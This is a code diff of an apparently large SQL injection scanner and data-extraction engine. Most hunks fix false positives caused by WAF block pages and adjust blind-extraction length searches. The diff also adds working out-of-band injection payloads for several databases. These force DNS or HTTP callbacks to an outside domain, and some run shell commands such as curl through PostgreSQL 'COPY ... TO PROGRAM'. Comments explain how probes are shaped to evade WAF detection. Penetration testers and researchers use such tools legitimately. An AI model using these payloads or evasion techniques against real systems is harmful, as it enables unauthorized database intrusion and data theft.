@@ -47865,13 +47865,20 @@ class Enumerator:
             _eo = self._error_oracle
             if _eo._body_size_oracle:
                 try:
-                    _rv_true = await _eo.evaluate("1=1")
-                    _rv_false = await _eo.evaluate("1=2")
+                    # FIX-CEO-BODY-SIZE-REVALIDATE-EXPR: Use extraction-representative
+                    # expressions (ASCII function call) rather than trivial 1=1/1=2.
+                    # WAFs that allow arithmetic comparisons often block SUBSTRING/ASCII
+                    # calls; re-validating with ASCII('A')>=65/66 catches this class of
+                    # WAF behaviour before committing to the body-size oracle.
+                    # ASCII('A')=65 is universally true across all 5 DBMSes.
+                    _rv_true = await _eo.evaluate("ASCII('A')>=65")
+                    _rv_false = await _eo.evaluate("ASCII('A')>=66")
                     if _rv_true is not True or _rv_false is not False:
                         LOG.warning(
                             "[_extract_str] error_oracle body-size re-validation failed "
-                            "(1=1→%r, 1=2→%r) — WAF blocking extraction uniformly; "
-                            "discarding body-size oracle", _rv_true, _rv_false)
+                            "(ASCII('A')>=65→%r, ASCII('A')>=66→%r) — WAF blocking "
+                            "extraction SQL uniformly; discarding body-size oracle",
+                            _rv_true, _rv_false)
                         _eval_fn = None
                         _oracle_name = ""
                 except Exception:
@@ -48249,57 +48256,43 @@ class Enumerator:
         _field_cap = _FIELD_MAX_LEN.get(_cur_field.lower(), 0)
         if _field_cap and _field_cap < _ext_max_pre:
             _ext_max_pre = _field_cap
-        low, high = 0, _ext_max_pre
+        # FIX-EXTRACT-STR-STYLE-A: Convert Style B (inclusive-hi, eq-probe) to Style A
+        # (exclusive-hi, lo-as-result) to match _randomized_mid's exclusive-hi contract.
+        # Root cause of 300-400 char lengths: _randomized_mid(lo, hi) treats hi as EXCLUSIVE
+        # (returns [lo, hi-1]) but _extract_str passed INCLUSIVE high. With a noisy oracle,
+        # the eq probe at some mid in 300-400 range randomly returns True → _length = mid.
+        # Style A eliminates the eq probe entirely (O(log n) vs O(2 log n)), sets _length = lo
+        # when the loop converges, and safely handles always-True oracle (lo converges to
+        # _ext_max_pre+1 which the post-loop guard catches).
+        low, high = 0, _ext_max_pre + 1  # hi is exclusive per _randomized_mid contract
         _bs_iter = 0  # binary-search iteration counter for yield points
-        while low <= high:
-            # BUG-EXTR-A FIX: Yield to the event loop every 4 iterations of the
-            # binary search.  On fast targets (localhost, LAN), the oracle evaluates
-            # instantly and this while-loop can spin through all iterations without
-            # giving asyncio a chance to service timers, cancellations, or other
-            # coroutines.  This was a major source of "100% CPU" complaints during
-            # extraction.  asyncio.sleep(0) costs ~1µs and caps CPU at a safe level.
+        while low < high:
+            # Yield to the event loop every 4 iterations so asyncio can service
+            # timers, cancellations, and other coroutines (prevents 100% CPU on LAN).
             _bs_iter += 1
             if _bs_iter % 4 == 0:
-                await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
+                await asyncio.sleep(0.001)
             # Also abort if extraction was externally cancelled.
             if not _EXTRACTION_ACTIVE[0]:
                 LOG.debug("[_extract_str] _EXTRACTION_ACTIVE cleared — aborting length search")
                 break
-            # BUG-V164-ENUMERATOR-EXTRACT-STR-FIXED-PIVOT FIX (HIGH, all 5 DBMSes;
-            # Enumerator._extract_str length binary search; B/BH/IN/T/TH/HQ techniques):
-            # Fixed pivot mid=(low+high)//2 in the _extract_str length search makes
-            # the length-probe sequence detectable by ML-based WAFs after 3-5 probes.
-            # _extract_str is the primary length-then-char extraction path for the
-            # Enumerator engine (main schema/data extraction engine for all DBMSes).
-            # Fix: use _randomized_mid(low, high) (TECHNIQUE-3) for bounded jitter.
+            # _randomized_mid returns a pivot in [low, high-1] (TECHNIQUE-3 WAF jitter).
             mid = _randomized_mid(low, high)
             try:
-                # BUG-V137-ENUMERATOR-EXTRACT-STR-STRICT-GT FIX (MEDIUM, all DBMSes):
-                # was >{mid} (strict greater-than). WAFs block strict >\d+ as a
-                # data-extraction indicator; >=\d+ is treated as benign comparison.
-                # >={mid+1} is semantically identical to >{mid} for integer lengths.
-                # The eq=mid fallback is unchanged and still handles exact matches.
-                # Numeric safety: mid+1 is a plain integer; no SQL delimiters modified.
+                # Probe: is length >= mid+1? (equivalent to length > mid, avoids strict >)
                 gt = await _eval_fn(f"({_len_q})>={mid+1}")
-                # BUG-EXTRACT-STR-LEN-NONE-FIX: None (WAF block) must not be
-                # treated as False. A WAF-blocked length probe narrows high=mid-1,
-                # converging the length to 0 -> empty extraction. Break instead.
+                # None = WAF-blocked probe — abort rather than narrowing wrongly.
                 if gt is None:
-                    break  # WAF-blocked probe -- abort length search
+                    break
                 elif gt:
                     low = mid + 1
                 else:
-                    eq = await _eval_fn(f"({_len_q})={mid}")
-                    if eq is None:
-                        break  # WAF-blocked probe -- abort length search
-                    elif eq:
-                        _length = mid
-                        break
-                    high = mid - 1
+                    high = mid
             except Exception:
                 break
-        
-        if _length <= 0:
+        _length = low  # lo IS the length when Style A converges correctly
+
+        if _length <= 0 or _length > _ext_max_pre:
             return ""
         # BUG-EXT-3 FIX (Req 7): Hard cap was always 256, silently truncating long values
         # (hashes, tokens, JWTs, long text columns) with no indication that data was lost.
@@ -49256,7 +49249,7 @@ class SecondOrderDetector:
 
 OOB_PAYLOADS_MAP={
     "MySQL":[
-        # LOAD_FILE variations
+        # LOAD_FILE variations — string context (param value is string)
         "' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         "' AND ExtractValue(1,CONCAT(0x7e,(SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120))))))-- -",
         "'; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
@@ -49267,18 +49260,26 @@ OOB_PAYLOADS_MAP={
         "admin' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))#",
         "' AND LOAD_FILE(CONCAT('\\\\\\\\','{token}','.{domain}','\\\\x'))-- -",
         "'; SELECT LOAD_FILE('\\\\\\\\{token}.{domain}\\\\x')-- -",
+        # LOAD_FILE variations — numeric context (param value is integer, no leading quote)
+        " AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        " AND ExtractValue(1,CONCAT(0x7e,(SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120))))))-- -",
+        "; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        " OR LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
     ],
-    
+
     "MariaDB":[
         "' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         "') AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         "1' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         "admin' AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))#",
         "'; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        # Numeric context variants
+        " AND LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        "; SELECT LOAD_FILE(CONCAT(CHAR(92),CHAR(92),'{token}',CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
     ],
-    
+
     "MSSQL":[
-        # xp_dirtree variations
+        # xp_dirtree variations — string context
         "'; DECLARE @h VARCHAR(999);SET @h=CHAR(92)+CHAR(92)+'{token}'+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @h-- -",
         "'; EXEC master..xp_fileexist CHAR(92)+CHAR(92)+'{token}'+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120)-- -",
         "'; EXEC master..xp_dirtree '\\\\\\\\{token}.{domain}\\\\x'-- -",
@@ -49292,10 +49293,15 @@ OOB_PAYLOADS_MAP={
         "'; SELECT * FROM fn_xe_file_target_read_file('\\\\\\\\{token}.{domain}\\\\*.xel',NULL,NULL,NULL)-- -",
         # fn_get_audit_file variations
         "'; SELECT * FROM sys.fn_get_audit_file('\\\\\\\\{token}.{domain}\\\\*',DEFAULT,DEFAULT)-- -",
+        # Numeric context variants (no leading quote — for ?id=1 style parameters)
+        "; DECLARE @h VARCHAR(999);SET @h=CHAR(92)+CHAR(92)+'{token}'+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @h-- -",
+        "; EXEC master..xp_dirtree '\\\\\\\\{token}.{domain}\\\\x'-- -",
+        "; EXEC master..xp_fileexist '\\\\\\\\{token}.{domain}\\\\x'-- -",
+        " AND 1=(SELECT 1 WHERE 1=1 AND (SELECT count(*) FROM master..xp_dirtree('\\\\\\\\{token}.{domain}\\\\x'))>=0)-- -",
     ],
-    
+
     "PostgreSQL":[
-        # dblink variations
+        # dblink variations — string context
         "' AND (SELECT dblink_connect($$host={token}.{domain} dbname=x connect_timeout=2$$))-- -",
         "'; SELECT dblink_connect_u($$host={token}.{domain} dbname=x connect_timeout=2$$)-- -",
         "'; SELECT dblink_connect('host={token}.{domain} dbname=x connect_timeout=2')-- -",
@@ -49311,10 +49317,16 @@ OOB_PAYLOADS_MAP={
         "admin'; COPY (SELECT '') TO PROGRAM 'nslookup {token}.{domain}'-- -",
         # pg_read_file variations (file access triggers DNS on some setups)
         "'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        # Numeric context variants (no leading quote)
+        " AND (SELECT dblink_connect($$host={token}.{domain} dbname=x connect_timeout=2$$))=''-- -",
+        "; SELECT dblink_connect('host={token}.{domain} dbname=x connect_timeout=2')-- -",
+        "; COPY (SELECT '') TO PROGRAM 'nslookup {token}.{domain}'-- -",
+        "; COPY (SELECT '') TO PROGRAM 'curl http://{token}.{domain}'-- -",
+        "; SELECT pg_read_file('//{token}.{domain}/x')-- -",
     ],
-    
+
     "Oracle":[
-        # UTL_INADDR variations
+        # UTL_INADDR variations — string context
         "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM dual)='1'-- -",
         "') AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM dual)='1'-- -",
         "1' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM dual)='1'-- -",
@@ -49332,6 +49344,12 @@ OOB_PAYLOADS_MAP={
         "' AND (SELECT HTTPURITYPE('http://{token}.{domain}').getclob() FROM dual)='x'-- -",
         # DBMS_LDAP variations
         "'; SELECT DBMS_LDAP.INIT('{token}.{domain}',389) FROM dual-- -",
+        # Numeric context variants (no leading quote — for ?id=1 style parameters)
+        " AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM dual) IS NOT NULL-- -",
+        " AND 1=(SELECT LENGTH(UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}')) FROM dual)-- -",
+        "; SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM dual-- -",
+        "; SELECT UTL_HTTP.REQUEST('http://{token}.{domain}/') FROM dual-- -",
+        " AND 1=(SELECT 1 FROM dual WHERE UTL_HTTP.REQUEST('http://{token}.{domain}/')='')-- -",
     ],
     
     "Sybase":[
@@ -55227,6 +55245,11 @@ class Scanner:
                 _bool_calibration_true_status = _true_status
             _true_body = _safe_decode_body(fp_true, encoding="utf-8", errors='replace', func_name='extraction_fp_true') if (fp_true and fp_true.body) else ""
             _false_body = _safe_decode_body(fp_false, encoding="utf-8", errors='replace', func_name='extraction_fp_false') if (fp_false and fp_false.body) else ""
+            # FIX-BOTH-WAF-BLOCKED-GLOBAL: compute once; reused in all oracle sub-branches below.
+            # When BOTH true and false probes return 4xx, any body/hash/SimHash/Wasserstein
+            # difference is WAF page-size noise — NOT a SQL injection signal.
+            _both_waf_blocked = (_true_status is not None and _false_status is not None
+                                 and _true_status >= 400 and _false_status >= 400)
 
             if _true_status != _false_status and _true_status is not None:
                 _boolean_oracle = True
@@ -55280,7 +55303,7 @@ class Scanner:
 
                     if _h_stab == _h_true:
                         # Hash is STABLE  but check if body SIZE difference is meaningful
-                        if _size_pct >= 10.0 or _page_size < 5000:
+                        if (_size_pct >= 10.0 or _page_size < 5000) and not _both_waf_blocked:
                             _boolean_oracle = True
                             _body_hash_true = _h_true
                             _body_hash_false = _h_false
@@ -55295,9 +55318,10 @@ class Scanner:
                             LOG.info("[Inference] Hash stable but body size diff too small (%.1f%%) "
                                      " minor token change, not injection signal",
                                      _size_pct)
-                    elif _size_pct > 2.0 or (_size_pct > 0.5 and len(_true_body) < 5000):
+                    elif not _both_waf_blocked and (_size_pct > 2.0 or (_size_pct > 0.5 and len(_true_body) < 5000)):
                         # Hash unstable but SIZE difference is significant (>2% for large pages, >0.5% for small)
                         # Rationale: On small pages, even 0.5% (3B on 660B) can be meaningful injection signal
+                        # Guard: skip if both probes are WAF-blocked (same WAF page with different sizes = noise)
                         _boolean_oracle = True
                         _bool_true_len = len(_true_body)
                         _bool_false_len = len(_false_body)
@@ -55315,7 +55339,7 @@ class Scanner:
                     _sim_tf = SimHasher.body_similarity(
                         ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b"",
                         ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b"")
-                    if _sim_tf < 0.92:
+                    if _sim_tf < 0.92 and not _both_waf_blocked:
                         _boolean_oracle = True
                         _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
                         _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
@@ -55354,16 +55378,25 @@ class Scanner:
                 LOG.info("[Inference] Wasserstein mean=%.3f n=%d (threshold=0.25)",
                          _wass_mean, len(_wass_dists))
                 if _wass_mean >= 0.25:
-                    _boolean_oracle = True
-                    _wfp_t_last, _wfp_f_last = _wass_pairs[-1][0], _wass_pairs[-1][1]
-                    _bool_norm_true = (
-                        ResponseNormaliser.normalise(_extract_body_safe(_wfp_t_last))
-                        if _validate_response(_wfp_t_last, allow_empty=True) else b"")
-                    _bool_norm_false = (
-                        ResponseNormaliser.normalise(_extract_body_safe(_wfp_f_last))
-                        if _validate_response(_wfp_f_last, allow_empty=True) else b"")
-                    print(f"[+] [Inference]  BOOLEAN ORACLE detected via Wasserstein! "
-                          f"dist={_wass_mean:.3f} (n={len(_wass_dists)} pairs)", flush=True)
+                    # FIX-WASS-WAF-BLOCKED: if all collected pairs are WAF-blocked (both 4xx),
+                    # the Wasserstein signal is WAF page-size noise, not SQL oracle signal.
+                    _wass_any_non_blocked = any(
+                        not (getattr(_wppt, 'status_code', 0) >= 400 and getattr(_wppf, 'status_code', 0) >= 400)
+                        for _wppt, _wppf, _, _ in _wass_pairs)
+                    if not _wass_any_non_blocked:
+                        LOG.info("[Inference] Wasserstein dist=%.3f but all %d pairs WAF-blocked "
+                                 "(both 4xx) — noise, not SQL signal; skipping oracle", _wass_mean, len(_wass_pairs))
+                    else:
+                        _boolean_oracle = True
+                        _wfp_t_last, _wfp_f_last = _wass_pairs[-1][0], _wass_pairs[-1][1]
+                        _bool_norm_true = (
+                            ResponseNormaliser.normalise(_extract_body_safe(_wfp_t_last))
+                            if _validate_response(_wfp_t_last, allow_empty=True) else b"")
+                        _bool_norm_false = (
+                            ResponseNormaliser.normalise(_extract_body_safe(_wfp_f_last))
+                            if _validate_response(_wfp_f_last, allow_empty=True) else b"")
+                        print(f"[+] [Inference]  BOOLEAN ORACLE detected via Wasserstein! "
+                              f"dist={_wass_mean:.3f} (n={len(_wass_dists)} pairs)", flush=True)
 
         #  HEADER ORACLE: For BH (header boolean-blind) technique
         # BH produces same status+body but DIFFERENT response headers.
@@ -69045,6 +69078,12 @@ async def blind_extract_string_v5(
                                   tamper_chain, baseline, 0, max_len + 1)
     if length == 0:
         return ""
+    # FIX-BES5-MAXLEN: _extract_int returns hi=max_len+1 when oracle always True.
+    # Cap to max_len so downstream char extraction doesn't fire max_len+1 probes on garbage.
+    if length > max_len:
+        LOG.warning("[blind_extract_string_v5] length=%d > max_len=%d — oracle malfunction "
+                    "suspected (always-True oracle?); capping to max_len", length, max_len)
+        length = max_len
     LOG.debug(f"  v5 extract: length={length}, launching {length} parallel char probes")
 
     # ── BUG-BES5-CHAR-FUNC FIX: DBMS-specific char_func upgrades ───────────────
@@ -94635,7 +94674,11 @@ class DoHOOBChannel:
                 # BUG-OAST-SESSION-ID FIX: use server session id for polling
                 _doh_cfg = getattr(self, "config", None)
                 _doh_server_sid = getattr(_doh_cfg, "_oob_server_session_id", "") or "" if _doh_cfg else ""
-                _doh_poll_id = _doh_server_sid if _doh_server_sid else (self.oast_token or "sqr")
+                # FIX-DOH-POLL-ID: include _oob_registered_token as fallback before oast_token.
+                # _oob_registered_token is the token returned by the OOB server at registration
+                # and is the canonical interaction ID to poll for.
+                _doh_reg_tok = getattr(_doh_cfg, "_oob_registered_token", "") or "" if _doh_cfg else ""
+                _doh_poll_id = _doh_server_sid or _doh_reg_tok or self.oast_token or "sqr"
                 fp = await engine.send("GET", f"{_doh_rest_server.rstrip('/')}/poll",
                     params={"id": _doh_poll_id, "secret": _doh_poll_id},
                     headers=h)
@@ -107241,7 +107284,10 @@ class TechniqueCascadeEngine:
                     if _t_waf and _f_waf:
                         _check_a_waf_counts[0] += 1  # blocked_count
                 except Exception:
-                    pass
+                    _t_waf = _f_waf = False
+                # FIX-CHECKA-BODYSIZE-WAF: record whether this pair was both WAF-blocked
+                # so the body-size delta check below doesn't accept WAF-page noise as signal.
+                _both_check_a_waf = bool(_t_waf and _f_waf)
                 _gap = abs(_ct_sim - _cf_sim)
                 _passed = False
                 if _gap > _gap_threshold * 1.0:
@@ -107255,7 +107301,10 @@ class TechniqueCascadeEngine:
                 # where SimHash gap was too small but body size changed significantly
                 # (e.g. a 1-row vs 0-row SQL result changing the table length) were
                 # never confirmed via the size delta. Replaced both references.
-                if not _passed and _fp_t and _fp_f and _fp_t.body and _fp_f.body:
+                if not _passed and not _both_check_a_waf and _fp_t and _fp_f and _fp_t.body and _fp_f.body:
+                    # FIX-CHECKA-BODYSIZE-WAF: skip body-size delta when both probes are WAF-blocked.
+                    # A WAF returning different-size block pages for true vs false probes is noise
+                    # (e.g. 155B vs 557B both at HTTP 400) — not SQL injection signal.
                     _len_t = len(_extract_body_safe(_fp_t))
                     _len_f = len(_extract_body_safe(_fp_f))
                     _len_max = max(_len_t, _len_f, 1)
@@ -114464,16 +114513,20 @@ class TechniqueCascadeEngine:
                                 _t_status = getattr(fp, "status_code", 500)
                                 _f_status = fp_f.status_code
                                 if {_t_status, _f_status} & {403, 406, 503}:
-                                    _waf_name = getattr(self, "waf_name", "")
-                                    if _waf_name:
-                                        print(f"[!]   WAF oracle detected: true={_t_status} false={_f_status} "
-                                              f"(WAF={_waf_name})  this may be WAF behavior, not SQL injection",
-                                              flush=True)
-                                        # Require SAME status code for true and false to confirm
-                                        if _t_status != _f_status:
-                                            print(f"[!]   Status code differs ({_t_status}{_f_status})  "
-                                                  "downgrading confidence (WAF behavioral oracle)")
-                                            _waf_oracle = True
+                                    _waf_name = getattr(self, "waf_name", "") or "unfingerprinted WAF"
+                                    # FIX-WAF-ORACLE-NONAME: the penalty block was gated on
+                                    # `if _waf_name:` which skipped the entire penalty for WAFs
+                                    # that weren't fingerprinted (the majority of cases).
+                                    # The status-code differential is the oracle signal regardless
+                                    # of whether the WAF brand is known — remove the gate.
+                                    print(f"[!]   WAF oracle detected: true={_t_status} false={_f_status} "
+                                          f"(WAF={_waf_name})  this may be WAF behavior, not SQL injection",
+                                          flush=True)
+                                    # Require SAME status code for true and false to confirm
+                                    if _t_status != _f_status:
+                                        print(f"[!]   Status code differs ({_t_status}→{_f_status})  "
+                                              "downgrading confidence (WAF behavioral oracle)")
+                                        _waf_oracle = True
                             # Header oracle: additional confidence boost
                             _hdr_diff_ok = False
                             try:
@@ -116100,11 +116153,12 @@ class TechniqueCascadeEngine:
                 # Header boolean  same confirmation as regular B technique
                 _nh = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                 _bh_sim = SimHasher.body_similarity(norm_base, _nh)
+                _bh_thresh = 1.0 - getattr(self, '_dynamic_gap', 0.45)
                 print(f"    [BH-bool] [{dbms}] req#{self._total_reqs} "
-                      f"sim={_bh_sim:.3f} thresh=0.600 "
-                      f"{' same' if _bh_sim >= 0.600 else ' DIFF'}")
+                      f"sim={_bh_sim:.3f} thresh={_bh_thresh:.3f} "
+                      f"{' same' if _bh_sim >= _bh_thresh else ' DIFF'}")
                 # Cross-header correlation for header boolean
-                if _bh_sim < 0.600:
+                if _bh_sim < _bh_thresh:
                     _gate_ref = getattr(self, '_gate', None)
                     if _gate_ref:  # waf_boolean_killed removed (was always False)
                         _bl_st = baseline.get("modal_status", 0) if isinstance(baseline, dict) else 0
@@ -116119,7 +116173,7 @@ class TechniqueCascadeEngine:
                             if _sc >= 5:
                                 LOG.debug(f"[RDF-CORR] {_sc} headers identical DIFF ({_dsig}) — noted, boolean kept enabled")
 
-                if _bh_sim >= 0.600:
+                if _bh_sim >= _bh_thresh:
                     # Same as baseline  check false-condition gap
                     _opp_payload = self._make_false_payload(payload)
                     if _opp_payload:
@@ -116177,10 +116231,13 @@ class TechniqueCascadeEngine:
                                     _bh_confirmed += 1
                                 print(f"[*]     BH multi-probe {_bh_mp+2}/6: "
                                       f"gap={_mp_gap:.3f} {' CONFIRMED' if _mp_gap > getattr(self, '_dynamic_gap', 0.45) else ' gap too small'} "
-                                      f"({_bh_confirmed}/3 needed)")
-                                if _bh_confirmed >= 3: break
+                                      f"({_bh_confirmed}/5 needed)")
+                                # FIX-BH-THRESHOLD: raise from 3/6 to 5/6 to match B-technique.
+                                # BH targets WAF-protected endpoints with high CDN response variance;
+                                # 3/6 produces false positives from natural CDN jitter alone.
+                                if _bh_confirmed >= 5: break
 
-                            if _bh_confirmed >= 3:
+                            if _bh_confirmed >= 5:
                                 _det_x = DetectionResult(
                                     param=param, technique=tech, payload=payload, dbms=dbms,
                                     confidence=0.85, notes=f"cascade_header_bh bypass=none gap={_bh_gap:.3f}")
@@ -116776,7 +116833,11 @@ class TechniqueCascadeEngine:
         elif tech == "O":
             # Out-of-band: the payload triggers a DNS/HTTP callback to the OOB server.
             _oob_url = getattr(self.config, "oob_server", None)
-            _oob_has_server = bool(_oob_url and getattr(self, '_oob_verifier', None))
+            # FIX-OOB-DEAD-CODE: self._oob_verifier is only set on UniversalScanOrchestrator,
+            # never on TechniqueCascadeEngine, making _oob_has_server always False and the
+            # entire OOB polling block dead code.  The polling below uses self.engine.send()
+            # directly and does NOT need _oob_verifier — remove the dead guard.
+            _oob_has_server = bool(_oob_url)
             _o_timing = fp.elapsed_ms >= time_threshold * 0.7
             _o_err = any(re.search(p, body, re.I) for pats in SQL_ERROR_PATTERNS.values() for p in pats)
             _o_verdict = (" polling OOB server" if _oob_has_server else
@@ -129250,7 +129311,13 @@ class SafeModeVerifier:
             # backend response) is harmless — the nonce parameter is ignored by backends.
             _smv_data_fmt = "json" if (data or "").strip().startswith("{") else "form"
             import random as _smv_rand
-            for _bp_true, _bp_false, _bp_ctx in _bool_probes:
+            # FIX-BOOL-CAPABLE-STABILITY: require 2+ confirming pairs before declaring
+            # boolean_capable=True. A single CDN cache-miss probe (sim≈0.94 by chance)
+            # can flip the oracle from FULL→DIFFERENTIAL on the next run; two independent
+            # confirmations from different probe styles are highly unlikely to both be
+            # CDN noise. Limit to first 5 pairs (10 HTTP requests max) to keep it fast.
+            _bool_confirms = 0
+            for _bp_true, _bp_false, _bp_ctx in _bool_probes[:5]:
                 # Always use unique per-probe nonces to bypass CDN edge caching.
                 _cb  = f"_smvnonce={_smv_rand.randint(100000, 999999)}"
                 _cb2 = f"_smvnonce={_smv_rand.randint(100000, 999999)}"
@@ -129266,9 +129333,12 @@ class SafeModeVerifier:
                 _len_d = abs(fp_t.content_length - fp_f.content_length)
                 _stat_d = _get_safe_status_code(fp_t) != fp_f.status_code
                 if sim < 0.95 or _len_d > 100 or _stat_d:
-                    boolean_capable = True
-                    _bool_detail = f"{_bp_ctx} sim={sim:.2f} len_={_len_d} status_={_stat_d}"
-                    break
+                    _bool_confirms += 1
+                    if _bool_confirms == 1:
+                        _bool_detail = f"{_bp_ctx} sim={sim:.2f} len_={_len_d} status_={_stat_d}"
+                    if _bool_confirms >= 2:
+                        boolean_capable = True
+                        break
             if boolean_capable:
                 recs.append(f"Boolean differentiation detected ({_bool_detail})")
         except Exception as _sqr_e:
@@ -129328,7 +129398,13 @@ class SafeModeVerifier:
                 ]
                 try:
                     _diff_data_fmt = "json" if (data or "").strip().startswith("{") else "form"
-                    for _dr in range(3):
+                    # FIX-DIFF-ORACLE-STABILITY: increase from 3→5 rounds, require 3/5
+                    # majority. With 3 rounds, EMD near the 0.018 noise floor can flip
+                    # DIFFERENTIAL↔TIMING/BLOCKED between runs (2/3 vs 1/3). 5 rounds
+                    # with 3/5 threshold is statistically more stable: a single noisy
+                    # round can't swing the verdict.
+                    _diff_emds = []
+                    for _dr in range(5):
                         _tp, _fp = _diff_probes[_dr % len(_diff_probes)]
                         import random as _df_rand
                         _df_url_t = url + ("&" if "?" in url else "?") + f"_smvnonce={_df_rand.randint(100000,999999)}"
@@ -129342,28 +129418,25 @@ class SafeModeVerifier:
                         stat_d = _get_safe_status_code(fp_t2) != fp_f2.status_code
                         _diff_emd_sum += emd
                         _diff_len_sum += len_d
+                        _diff_emds.append(emd)
                         if stat_d:
                             _diff_stat_sum = True
-                        # FIX-EMD-THRESHOLD: 0.010 is at the noise floor for targets
-                        # with server-side token rotation (CSRF nonces, ad IDs that
-                        # survive ResponseNormaliser).  Observed emd=0.0130 oscillates
-                        # above/below 0.010 between runs, flipping oracle mode.
-                        # Raised to 0.018 to sit above typical normaliser-resistant noise.
                         if emd > 0.018 or len_d > 150 or stat_d:
                             _diff_rounds += 1
                         await asyncio.sleep(0.15)
 
-                    # Require majority (2/3) for DIFFERENTIAL
-                    _emd_avg  = _diff_emd_sum / 3
-                    _len_avg  = _diff_len_sum / 3
-                    diff_capable = _diff_rounds >= 2 or _diff_stat_sum
+                    # Require 3/5 majority for DIFFERENTIAL (was 2/3)
+                    _emd_avg  = _diff_emd_sum / 5
+                    _emd_med  = sorted(_diff_emds)[2] if _diff_emds else 0.0
+                    _len_avg  = _diff_len_sum / 5
+                    diff_capable = _diff_rounds >= 3 or _diff_stat_sum
                     if diff_capable:
                         recs.append(
-                            f"Differential oracle active (emd={_emd_avg:.4f} len_={int(_len_avg)} "
+                            f"Differential oracle active (emd_med={_emd_med:.4f} rounds={_diff_rounds}/5 "
                             f"status_diff={_diff_stat_sum})  scanning in DIFFERENTIAL mode")
                     else:
-                        LOG.debug(f"[SafeMode] Differential failed {_diff_rounds}/3 rounds "
-                                  f"emd_avg={_emd_avg:.4f}")
+                        LOG.debug(f"[SafeMode] Differential failed {_diff_rounds}/5 rounds "
+                                  f"emd_avg={_emd_avg:.4f} emd_med={_emd_med:.4f}")
                 except Exception as _diff_e:
                     LOG.debug(f"Differential capability probe failed: {_diff_e}")
 
@@ -150958,7 +151031,12 @@ class ConditionalErrorTypeOracle:
                 # (e.g. length=466, binary garbage chars) because every extraction probe
                 # is also WAF-blocked and all return the larger WAF page.  Skip.
                 _novel_waf_codes = {400, 403, 406, 429, 430, 503}
-                if clean_status in _novel_waf_codes and err_status in _novel_waf_codes:
+                # FIX-NOVEL-WAF-SINGLE-SIDE: original guard only skipped when BOTH statuses
+                # were WAF codes.  If err_status is a WAF code but clean_status is 200,
+                # the "error" response is actually a WAF block page — not a SQL error type.
+                # Accepting it produces viable: TRUE557 FALSE155 false positives.
+                # Also skip when clean_status alone is WAF-blocked (true probe blocked).
+                if err_status in _novel_waf_codes or clean_status in _novel_waf_codes:
                     continue
                 if _eo_pct >= 0.10 or _eo_max < 5000:
                     # BUG-ERRTYPE-ORACLE-WAF-COLLISION FIX: calibration with 1=1/1=2
@@ -164535,25 +164613,24 @@ class ConditionalErrorOracle:
                                   f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                   flush=True)
                             continue
-                        # FIX-CEO-BASELINE-WAF (body-size path): When baseline is WAF-blocked
-                        # AND both probes return the same WAF status but with meaningfully
-                        # different body sizes, the WAF is discriminating on SQL content →
-                        # use body-size mode as the oracle signal.
+                        # FIX-CEO-WAF-NOISE-BODYSIZE: When baseline is WAF-blocked AND both
+                        # probes also return the SAME WAF status (e.g. all three are 400),
+                        # body-size differences are WAF page noise — not SQL discrimination.
+                        # Accepting this oracle causes extraction to converge on garbage values
+                        # (e.g. Length=466, binary garbage chars) because all extraction probes
+                        # are also WAF-blocked and body sizes vary randomly around 100-600B.
+                        # REMOVED: the original FIX-CEO-BASELINE-WAF body-size path that fired
+                        # when baseline_status == t_st == f_st.  Require at least one probe to
+                        # return a DIFFERENT status than the others to prove SQL discrimination.
                         if (_baseline_is_waf
